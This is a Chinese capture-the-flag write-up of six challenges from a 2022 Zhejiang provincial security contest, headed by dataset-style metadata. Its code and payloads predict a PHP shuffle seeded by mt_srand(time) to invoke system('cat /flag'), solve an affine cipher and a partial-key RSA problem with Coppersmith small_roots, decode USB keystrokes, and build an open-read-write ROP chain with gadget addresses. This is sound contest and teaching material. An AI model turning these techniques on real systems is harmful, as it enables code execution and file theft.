---
title: 浙江省第五届网络安全竞赛部分 WP by 7coin
contest: 浙江省信安赛
year: 2022
difficulty: medium
vuln_type: misc_unknown
tags: [mt_srand, time-seed, shuffle, USB-HID, base64-base32, affine-cipher, RSA-Coppersmith, small_roots, ROP-ORW, 7coin]
attack_chain:
  - Web ezphp: mt_srand(time) 预测 shuffle 后 system/ls 在数组中的下标 → 调用 system("cat /flag")
  - Misc base64-base32: 双层编码，先 base64 再 base32
  - Misc USB HID: tshark usb.capdata 提取 → normalKeys/shiftKeys 字典映射 → "mik<DEL>mae..." 输出
  - Misc m4a reversed zip: 字节反序恢复 zip 文件
  - Crypto 仿射: c = (a*x + 7) mod 37, a = n-1, ans = (num - 7) * inverse(key, 37) mod 37
  - Crypto RSA: 已知 p 高 560 bit + Coppersmith small_roots(X=2^(1024-560-i.nbits()), beta=0.4) + 2^15 迭代
  - Pwn: pop_rax=0x400a4f + syscall=0x4025ab + ROP + open(0xaf2faf="/flag") + read/write ORW
  - payload: p64(0) + pop_rax(2) + pop_rdi(0xaf2faf) + pop_rsi(0) + syscall + pop_rax(0) + read(3, buf) + pop_rax(1) + write(1, buf)
key_payload: 'mt_srand(time)+shuffle 下标 + USB HID normalKeys + 仿射 inverse(key, 37) + Coppersmith small_roots + ORW ROP'
one_liner: 浙江省信安赛 6 题综合：mt_srand 时间种子预测 + USB HID 字典 + 仿射密码 + Coppersmith small_roots + ORW ROP。
lesson: mt_srand(time) 是 PHP shuffle 预测经典套路；Coppersmith small_roots 是已知 p 部分位的 RSA 攻击方法。
quality: high
---

# 浙江省第五届网络安全竞赛部分 WP by 7coin

**来源**: ctfiot.com ID 58989
**队伍**: 7coin（成绩 15）

## 1. Web - ezphp
```php
function getPOS($time_) {
    mt_srand($time_);
    $a = array("system", "ls");
    for ($i=0; $i<=10000; $i++) {
        array_push($a, "Ctfer");
    }
    shuffle($a);
    $system = ""; $ls = "";
    for ($i=0; $i<10003; $i++) {
        if ($a[$i] == "system") $system = $i;
        if ($a[$i] == "ls") $ls = $i;
    }
    return [$system, $ls];
}
```
- `mt_srand(time())` 预测
- 算出 system 和 ls 的下标
- `?b=$system&c=$ls` 触发 `$a[b]($a[c])` = `system("ls")` → `system("cat /flag")`

## 2. Misc - base64-base32
- `FIWOI...==` 先 base64 解 → `SVJB...==` 再 base64 解
- 双层解码

## 3. Misc - USB HID
```python
# tshark -r test.pcapng -T fields -e usb.capdata > usbdata.txt
normalKeys = {"04":"a", "05":"b", "06":"c", ..., "1c":"y", "1d":"z",
              "1e":"1", "1f":"2", ..., "27":"0", "28":"<RET>", "2a":"<DEL>", ...}
shiftKeys = {"04":"A", "05":"B", ..., "27":")", "2d":"_", "2f":"{", "30":"}", ...}

nums = []
keys = open('key.txt')
for line in keys:
    if len(line) != 17: continue
    nums.append(line[0:2] + line[4:6])
output = ""
for n in nums:
    if n[2:4] == "00": continue
    if n[2:4] in normalKeys:
        if n[0:2] == "02": output += shiftKeys[n[2:4]]
        else: output += normalKeys[n[2:4]]
print('output :' + output)
# output: mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d
```

## 4. Misc - m4a reversed zip
```python
def Re(inputfile, outputfile):
    hex_list = []
    with open(inputfile, 'rb') as f:
        while True:
            a = f.read(1)
            if not a: break
            hex_list.append(a)
    mylist = hex_list[::-1]
    with open(outputfile, 'wb') as f:
        for value in mylist:
            f.write(value)
Re("m4a", "flag.zip")
```

## 5. Crypto - 仿射密码
```python
str = 'abcdefghijklmnopqrstuvwxyz0123456789+='
n = 176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333
key = n - 1
c = 'u66hp7nuh01puoaip10pi6o0vzavnu11'
flag = ''
for i in c:
    num = str.index(i)
    ans = (num - 7) * gmpy2.invert(key, 37) % 37
    flag += str[ans]
# flag = DASCTF{799a03b7a82076f5028059681df1b722}
```

## 6. Crypto - RSA (Coppersmith)
```python
n = 21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533
p = 1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779
e = 65537
PR = PolynomialRing(Zmod(n), 'x')
for i in tqdm.tqdm(range(2 ** 15)):
    i = Integer(i)
    f = p + i * 2 ** (560) + x * 2 ** (560 + i.nbits())
    res = f.monic().small_roots(X=2^(1024-560-i.nbits()), beta=0.4)
    if res:
        p = p + i * 2 ** (560) + int(res[0]) * 2 ** (560 + i.nbits())
        q = n // p
        if p * q == n:
            d = inverse(e, (p-1)*(q-1))
            print(long_to_bytes(int(pow(c, d, n))))
# flag = DASCTF{ce73935b2e83a78aa5079a9e59ae4980}
```

## 7. Pwn - ORW
```python
pop_rax = 0x400a4f
syscall = 0x4025ab
pop_rdi = 0x4008f6
pop_rsi = 0x40416f
pop_rdx = 0x51d4b6
pop_rbx = 0x402498
popDxSi = 0x51d559
buf = 0x98a000
leave = 0x4015cb

# payload: open + read + write ORW
payload  = p64(0) + p64(pop_rax) + p64(2)              # open
payload += p64(pop_rdi) + p64(0xaf2faf) + p64(pop_rsi) + p64(0) + p64(syscall)
payload += p64(pop_rax) + p64(0)                        # read
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x100) + p64(syscall)
payload += p64(pop_rax) + p64(1)                        # write
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x100) + p64(syscall)

# 0xaf2faf = '/flag' 字符串
```

## 评价
浙江省信安赛 6 题综合：mt_srand 时间种子预测 + USB HID 字典 + 仿射密码 + Coppersmith small_roots + ORW ROP。考察 PHP 内部随机性 + USB 协议 + 经典密码学 + Sage 数学。
